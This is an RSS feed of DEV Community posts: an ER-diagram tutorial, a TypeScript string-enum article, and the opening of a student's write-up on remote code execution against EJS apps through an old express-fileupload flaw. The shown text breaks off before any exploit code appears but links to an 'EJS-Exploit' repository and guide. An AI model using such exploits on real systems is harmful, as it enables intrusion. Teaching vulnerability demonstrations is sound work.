<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Entity-Relationship Diagram</title>
      <author>hebaShakeel</author>
      <pubDate>Sat, 05 Jun 2021 11:44:37 +0000</pubDate>
      <link>https://dev.to/hebashakeel/entity-relationship-diagram-3jh</link>
      <guid>https://dev.to/hebashakeel/entity-relationship-diagram-3jh</guid>
      <description>&lt;p&gt;It is a high level data model diagram which defines the conceptual view of the database. It indicates the relation among entities.&lt;br&gt;
Before making the actual database, first the ER-diagram is drawn to show the relations and many more things.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Components of ER Diagram:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Entity&lt;/strong&gt;&lt;br&gt;
i) It is a real-world object.&lt;br&gt;
ii) It can be physical.&lt;br&gt;
iii) It can be logical. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Entity Set&lt;/strong&gt; - It is a set (or collection) of entities of the same type which share the similar properties or attributes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;An entity can be characterized into two types:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;i) Strong Entity&lt;/strong&gt; -&lt;br&gt;
-&amp;gt; It has a Primary Key.&lt;br&gt;
-&amp;gt; It is not dependent.&lt;br&gt;
-&amp;gt; They are shown in single rectangle&lt;br&gt;
&lt;strong&gt;ii) Weak Entity&lt;/strong&gt; - &lt;br&gt;
-&amp;gt; It doesn't have the sufficient attributes to form Primary Key.&lt;br&gt;
-&amp;gt; It is dependent on the Strong Entity.&lt;br&gt;
-&amp;gt; They are shown in double Rectangle.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--K12x2B7Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xdmpsu8wk0c9u4dvc8fb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--K12x2B7Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xdmpsu8wk0c9u4dvc8fb.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Total Participation&lt;/strong&gt; - Weak Entity always has total participation with the Relationship. This means that each entity in the entity set must compulsorily participate in at least one relationship instance in that relationship set.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Attributes&lt;/strong&gt; - They are the properties that describe the entity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;An attribute can be characterized into:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Simple Attributes:&lt;/strong&gt; They are represented by oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fPgeZbEs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ds2kv7b3qxi200ktw78.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fPgeZbEs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ds2kv7b3qxi200ktw78.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Multi-valued Attributes:&lt;/strong&gt; Multiple values for a single attribute. They are represented by double oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--xd6mKsvz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uqr3pickbhr7yn5028dp.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xd6mKsvz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uqr3pickbhr7yn5028dp.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Single-Valued Attributes:&lt;/strong&gt; Each and every entity will have only one value.&lt;br&gt;
&lt;strong&gt;Example&lt;/strong&gt; - ID&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Composite Attributes:&lt;/strong&gt; Those attributes that can be divided further.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--D2Wzo55b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n2npqhfjv7i8s9qlw8ex.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--D2Wzo55b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n2npqhfjv7i8s9qlw8ex.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5) Derived Attributes:&lt;/strong&gt; Those attributes whose values are derived from another attribute. They are represented by dotted oval.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DJTvs6dM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t90qaescirb65ji94h2y.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DJTvs6dM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t90qaescirb65ji94h2y.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Age is a derived attribute since age can be derived from the Date of Birth.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6) Key Attribute:&lt;/strong&gt; Attribute which can uniquely define the whole tuple is called a Key Attribute.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;- ID&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qMvFBDDk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q319zng3m8t6i3tz5qvb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qMvFBDDk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q319zng3m8t6i3tz5qvb.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Relationship&lt;/strong&gt;&lt;br&gt;
It indicates how each and every entity is related with every other entity.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Degree of Relationship:&lt;/strong&gt; A relationship where a number of different entity set participate is called as degree of a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Degree of relationship can be categorized into the following types:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Unary&lt;/strong&gt; - Only one Entity set participates in a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--WDqlBGcI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6qq1eyfi3552nsgzgu21.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--WDqlBGcI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6qq1eyfi3552nsgzgu21.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Binary&lt;/strong&gt; - Two Entity Sets participate in a relationship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It is further divided into four types:&lt;br&gt;
&lt;strong&gt;i) One-to-One:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FcovQUSw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/deoyrprq9y0om6re6kuc.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ii) One-to-Many:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Af_FJwAW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g4apt41dt4snydomuchk.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Af_FJwAW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g4apt41dt4snydomuchk.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;iii) Many-to-One:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JiwvbMMw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rtpzf4hz3rpjig61btcx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JiwvbMMw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rtpzf4hz3rpjig61btcx.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;iv) Many-to-Many:&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bFOay-Y9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/atqcu2c8dg0bi1e6ycll.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bFOay-Y9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/atqcu2c8dg0bi1e6ycll.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Ternary&lt;/strong&gt; - When three entity sets participate in a relationship.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wTRptQOg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eixexawkf2o93u6hzt2p.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wTRptQOg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eixexawkf2o93u6hzt2p.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) n-ary&lt;/strong&gt; - When more than three entity set involves in a relationship, it is called &lt;strong&gt;n-ary relationship&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary of ER-Diagram Symbols&lt;/strong&gt;&lt;br&gt;
1) Entity or Strong Entity:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--q8C1HJ7---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gpts8dv15vbulbujx7ku.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--q8C1HJ7---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gpts8dv15vbulbujx7ku.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Weak Entity:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cuztCABZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nhrzuztb0qghbig8gwu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--cuztCABZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nhrzuztb0qghbig8gwu.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Attribute:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DuhgRrHQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ogtg2c83cqjk2xboj4v5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DuhgRrHQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ogtg2c83cqjk2xboj4v5.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Multi-valued Attribute:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kRhsXCvF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vx9phpeyuugwzw2xt04.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kRhsXCvF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4vx9phpeyuugwzw2xt04.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5) Relationship:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dFtDvlRY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1hq89725af4rfzp9take.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dFtDvlRY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1hq89725af4rfzp9take.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) Weak Relationship:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_NsllalX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mk2nitsakbcid597z6rz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_NsllalX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mk2nitsakbcid597z6rz.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That's all for today.&lt;br&gt;
Thank You.&lt;br&gt;
Hope to see you in my next article...&lt;/p&gt;

</description>
      <category>database</category>
      <category>computerscience</category>
    </item>
    <item>
      <title>Typescript: String Enums, the easy way</title>
      <author>Navneet Karnani</author>
      <pubDate>Sat, 05 Jun 2021 11:30:48 +0000</pubDate>
      <link>https://dev.to/mandraketech/typescript-string-enums-the-easy-way-1ke4</link>
      <guid>https://dev.to/mandraketech/typescript-string-enums-the-easy-way-1ke4</guid>
      <description>&lt;p&gt;The most common use cases for an enum are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Keys and associated non-string values &lt;/li&gt;
&lt;li&gt;Keys, and string values that match the keys&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, don't read this wrong. I just don't want to replicate everything that is written in the Typescript Handbook ( &lt;a href="https://www.typescriptlang.org/docs/handbook/enums.html"&gt;https://www.typescriptlang.org/docs/handbook/enums.html&lt;/a&gt; )&lt;/p&gt;

&lt;p&gt;The first one is adequately handled in Typescript. Just by using:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyEnum {
  first,
  second,
  third
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;But the second case looks more like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyStringEnum {
  first = 'first',
  second = 'second',
  third = 'third'
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As the number of values  increase, it starts getting difficult to manage. And I see lot of boilerplate here. Also, there is scope for mistakes. For example, it is possible to get into this situation:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyStringEnum {
  first = 'fifth',
  second = 'second',
  third = 'third'
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the Handbook, look at all the complexity required to do a reverse lookup from the Enums.&lt;/p&gt;

&lt;p&gt;Here is my proposal, to build a simple structure that you can implement quickly.&lt;/p&gt;

&lt;p&gt;Lets start with defining the values we want to be the "keys" in the enum:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;const VALID_ENUM_VALUES = ['first', 'second', 'third'] as const;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Notice the &lt;code&gt;as const&lt;/code&gt; at the end of the statement. This is what will make the difference.&lt;/p&gt;

&lt;p&gt;Lets define the type that we can use in the code, to ensure we are not using any invalid values:&lt;br&gt;
&lt;code&gt;type MyEnum = typeof VALID_ENUM_VALUES[number];&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you type this in VSCode, and hover your mouse over &lt;code&gt;MyEnum&lt;/code&gt;, you should see that this is the equivalent of defining:&lt;br&gt;
&lt;code&gt;type MyEnum = 'first' | 'second' | 'third';&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;[number]&lt;/code&gt; tells Typescript to get all the "number based subscripts" of the array.&lt;/p&gt;

&lt;p&gt;The additional advantage, is, if you make changes to the &lt;code&gt;VALID_ENUM_VALUES&lt;/code&gt; array, the &lt;code&gt;MyEnum&lt;/code&gt; changes with it. &lt;/p&gt;

&lt;p&gt;So, if you were to type the following code in the editor:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.log("Valid values of the enum are:", VALID_ENUM_VALUES);
const valueToCheck = 'first';
console.log(`Check if '${valueToCheck}' is part of the enum`, VALID_ENUM_VALUES.includes(valueToCheck))

// Error here, because "hello" is not a value in the VALID_ENUM_VALUES array.
const typedVar: MyEnum = 'hello';
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Reverse lookups are not necessary. But, you do want a way to check if a given value is  valid in the context of this Enum. For that, lets write a type asserter:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function isValid(param: unknown): asserts param is MyEnum {
    assert( param &amp;amp;&amp;amp; typeof param === 'string' &amp;amp;&amp;amp; VALID_ENUM_VALUES.includes(param as MyEnum));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now, in this context:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const myStr = 'first';
if ( isValid(myStr)) {
  // here, if 'myStr' is implicitly of type 'MyEnum'
  console.log(`${myStr} is a valid Enum value`);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Another use of this construct, is in defining Objects with keys. Take a look:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyRecordType = Record&amp;lt;MyEnum, unknown&amp;gt;;

// the 'myValue' below will error, because '{}' is not a valid value
const myValue: MyRecordType = {};

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here, the type definition is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyRecordType = {
  first: unknown;
  second: unknown;
  third: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You may change the 'unknown' to any relevant type. So, this gives you a quick way of defining objects with a given structure, and defined types. Obviously, more complex cases are better handled manually.&lt;/p&gt;

&lt;p&gt;Here is another variation of the same:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyPartialRecordType = Partial&amp;lt;MyRecordType&amp;gt;;
// no error here
const myPartialValue: MyPartialRecordType = {};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyPartialRecordType = {
  first?: unknown;
  second?: unknown;
  third?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you want to use these in combination, try this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const MUST_HAVE_PARAMS = ['one', 'two'] as const;
type MandatoryParams = typeof MUST_HAVE_PARAMS[number];
const OPTIONAL_PARAMS = ['three', 'four'] as const;
type OptionalParams = typeof OPTIONAL_PARAMS[number];
type MixedRecord = Record&amp;lt;MandatoryParams, unknown&amp;gt; &amp;amp; Partial&amp;lt;Record&amp;lt;OptionalParams, unknown&amp;gt;&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MixedRecord = {
    one: unknown;
    two: unknown; 
} &amp;amp; {
    three?: unknown;
    four?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;or, to simplify it further:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MixedRecord = {
    one: unknown;
    two: unknown; 
    three?: unknown;
    four?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So, you can now create a Union type, Record type, and also have a array to validate the values against.&lt;/p&gt;

&lt;p&gt;Another interesting example, involving Mapped Types:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const KNOWN_PARAMS_TYPES = ['id', 'name'] as const;
type KnownParams = typeof KNOWN_PARAMS_TYPES[number];

const UNKNOWN_PARAMS_TYPES = ['contentsOfWallet'] as const;
type UnknownParams = typeof UNKNOWN_PARAMS_TYPES[number];

type AllParams = KnownParams | UnknownParams;

type ValueType&amp;lt;T extends AllParams&amp;gt; = T extends KnownParams ? string : unknown;
type ParamType = {
    [Property in AllParams]: ValueType&amp;lt;Property&amp;gt;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type ParamType = {
    id: string;
    name: string;
    contentsOfWallet: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This may look like a lot of magic for something that can be defined in less space, but look at what is available:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Arrays of valid field names, that can be used for input validation, for example when you are dealing with http query strings and want to check if the parameter name is valid&lt;/li&gt;
&lt;li&gt;String union types for use within the application code, for those places where you would have otherwise used &lt;code&gt;key of ParamType&lt;/code&gt; as the type&lt;/li&gt;
&lt;li&gt;A structure that will update itself, as you add more parameters to the known / unknown parts.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In summary, for cases where you want an array of values to use in various places in the application, and still want type safe data structures, this kind of organisation will go a long way in making your code extensible, using the power of Typescript.&lt;/p&gt;

&lt;p&gt;This blog was originally published by Navneet Karnani ( &lt;a href="mailto:navneet@mandraketech.in"&gt;navneet@mandraketech.in&lt;/a&gt; ) on his blog at: &lt;a href="https://blog.mandraketech.in/typescript-string-enums"&gt;https://blog.mandraketech.in/typescript-string-enums&lt;/a&gt;&lt;/p&gt;

</description>
      <category>typescript</category>
      <category>javascript</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>Simple Remote Code Execution on EJS Web Applications with express-fileupload</title>
      <author>boiledsteak</author>
      <pubDate>Sat, 05 Jun 2021 11:18:36 +0000</pubDate>
      <link>https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</link>
      <guid>https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9MXFn2Uy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/overview-diagram.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9MXFn2Uy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/overview-diagram.png" alt="attack scenario diagram"&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://github.com/boiledsteak/EJS-Exploit/blob/main/EJS-RCE-user-guide-plain.docx"&gt;TLDR with no explaination&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As an IT / cybersecurity student, I heavily relied on searching online for guides and forums to help me with my assignments. So this is me giving back to the community 😄&lt;/p&gt;

&lt;p&gt;In this post I will explain how to exploit a vulnerability in an older version of a NodeJS library to enable RCE. Many concepts and technologies used will require an&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;intermmediate level of hands-on knowledge of cybersecurity&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I will not explain every term. The entire process is quite simple. If you are unfamiliar with anything, try read it up. Everything mentioned is fairly common.&lt;/p&gt;

&lt;p&gt;This Proof of Concept (POC) is a simple example of RCE. &lt;strong&gt;Good for demonstrating RCE to an audience without technical knowledge.&lt;/strong&gt; I doubt it can be used in the wild for penetration testing or for any malicious purposes. In fact the author of the dependency has a &lt;a href="https://github.com/richardgirges/express-fileupload"&gt;glaring warning&lt;/a&gt; of this vulnerability at the top of their github repo&lt;br&gt;
